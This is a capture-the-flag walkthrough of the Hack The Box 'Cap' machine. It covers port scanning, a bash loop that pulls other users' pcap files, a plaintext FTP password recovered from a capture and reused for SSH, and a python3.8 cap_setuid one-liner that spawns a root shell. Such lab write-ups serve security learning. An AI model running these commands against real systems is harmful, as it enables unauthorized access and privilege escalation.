---
title: "[EASY] HTB-Cap"
draft: false
tags:
  - htb
  - linux
  - ftp
  - pcap
  - wireshark
  - setuid
  - capabilities
---
## Information Gathering
### Rustscan

**Rustscan** finds **FTP**, **SSH**, and **HTTP** open:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/cap]
└─$ rustscan --addresses 10.10.10.245 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
<snip>
Host is up, received conn-refused (1.6s latency).
Scanned at 2024-04-06 11:41:43 EDT for 4s

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

### Nmap

Nmap finds nothing much:

```bash
┌──(yoon㉿kali)-[~/Documents/htb/cap]
└─$ sudo nmap -sVC -p 21,22,80 10.10.10.245                 
[sudo] password for yoon: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-06 11:42 EDT
Nmap scan report for 10.10.10.245 (10.10.10.245)
Host is up (0.98s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
<snip>
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 249.78 seconds
```

## Enumeration
### FTP - TCP 21

It seems like anonymous login is not allowed, I would have to come back to FTP with valid credentials:

![](https://i.imgur.com/2sL4k9k.png)



### HTTP - TCP 80

The website shows a security dashboard for user **Nathan**:

![](https://i.imgur.com/NwArXML.png)


Going to `/capture` will read me to `http://10.10.10.245/data/1`, where I can download packets pcap file:

![](https://i.imgur.com/8hONvPE.png)


After downloading, I can see all the packets that is being sent from my IP to the target server:

![](https://i.imgur.com/pGmkEWY.png)


`http://10.10.10.245/netstat` shows network running on server:

![](https://i.imgur.com/2lp23J1.png)


`http://10.10.10.245/ip` shows the result of **ifconfig** command:

![](https://i.imgur.com/I1JJOii.png)

Directory Bruteforcing finds nothing intriguing:

`sudo feroxbuster -u http://10.10.10.245 -n -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`

![](https://i.imgur.com/lwBVQxd.png)

## Shell as Nathan
### Bruteforce on /download

I tried Command Injection on `/netstat` and `/ip` parameters but both weren't vulnerable. So I will move on to bruteforcing `/data/<number>` since there might be a download from other users as well.

Using bash script, I can automate this procedure, which will download files from `/download/0` to `/download/100`:

```bash
#!/bin/bash

# Loop from 1 to 100
for ((i = 0; i <= 100; i++)); do
    url="http://10.10.10.245/download/$i"

    # Check if the URL returns non-empty content
    response=$(curl -s -o /dev/null -w "%{http_code}" "$url")
    
    # If the response is not empty (HTTP status 200), download the file
    if [ "$response" == "200" ]; then
        echo "Downloading file $i..."
        curl -O "$url"
    else
        echo "Skipping file $i (HTTP $response)"
    fi
done
```


Running the bash script discovered one more download which is /download/0`:

![](https://i.imgur.com/DfI7eul.png)


Before analyzing the file **0** with **Wireshark**, I will hunt for keyword **pas** and it discovers: **Buck3tH4TF0RM3!**

`strings 0 | grep -i 'pass'`

![](https://i.imgur.com/pUKoWji.png)

Opening file **0** using Wireshark shows that found password is from user **Nathan** during he's FTP authentication:

![](https://i.imgur.com/kzod7lD.png)

We can see it in plain text by following the TCP Stream:

![](https://i.imgur.com/VOoRwmJ.png)



### FTP nathan

Using the found credentials, I can sign-in to FTP as **nathan**:

![](https://i.imgur.com/MRghB9l.png)


Below is how `/var/www/html` is consisted for this server and we can view all the **.pcap** files on `/var/www/html/upload`:

![](https://i.imgur.com/VTSDg5E.png)

Since FTP shell is restrictive to commands, I tried to upload reverse shell to `/var/www/html` but permission was denied for all the folder.

Luckily, **nathan** is reusing the same password for his SSH connection as well so I can obtain a stable shell through SSH.

## Privesc: nathan to root

Running **linpeas.sh** discovers **capabilites** on **python3.8**:


![](https://i.imgur.com/vL4vE6P.png)

**cap_setuid** has the following ability according to the man page:

> * Make arbitrary manipulations of process UIDs (setuid(2), setreuid(2), setresuid(2), setfsuid(2)); * forge UID when passing socket credentials via UNIX domain sockets; * write a user ID mapping in a user namespace (see user_namespaces(7)).


I can abuse this capability following guide from [GTFOBins](https://gtfobins.github.io/gtfobins/python/): 

![](https://i.imgur.com/LlCkMFT.png)


Running the command from above, It instantly give me shell as the root:

`/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'`

![](https://i.imgur.com/GgiF1oF.png)


## References
- https://gtfobins.github.io/gtfobins/python/